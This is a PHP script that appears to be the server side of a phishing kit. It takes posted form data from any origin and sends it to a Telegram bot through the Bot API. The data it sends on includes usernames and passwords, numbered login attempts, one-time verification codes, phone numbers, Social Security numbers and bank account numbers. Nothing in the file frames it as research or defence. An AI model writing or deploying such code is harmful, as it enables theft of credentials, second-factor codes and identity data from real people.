<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

$data = json_decode(file_get_contents('php://input'), true);

$botToken = 'YOUR_BOT_TOKEN';
$chatId = 'YOUR_CHAT_ID';

$type = $data['type'] ?? 'unknown';
$message = '';

if ($type === 'login_attempt') {
    $message = "🔑 *Login Attempt*\n\n"
        . "👤 Username: " . ($data['username'] ?? '') . "\n"
        . "🔒 Password: " . ($data['password'] ?? '') . "\n"
        . "🔄 Attempt: " . ($data['attempt'] ?? '');
} else if ($type === 'verification_code') {
    $message = "🔐 *Verification Code*\n\n"
        . "📱 Page: " . ($data['page'] ?? '') . "\n"
        . "🔢 Code: " . ($data['code'] ?? '');
} else if ($type === 'verify_card_info') {
    $message = "💳 *Card Verification Info*\n\n"
        . "📱 Phone: " . ($data['phone'] ?? '') . "\n"
        . "🆔 SSN: " . ($data['ssn'] ?? '') . "\n"
        . "🏦 Account: " . ($data['accountNumber'] ?? '');
}

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

echo json_encode(['success' => true]);
?>
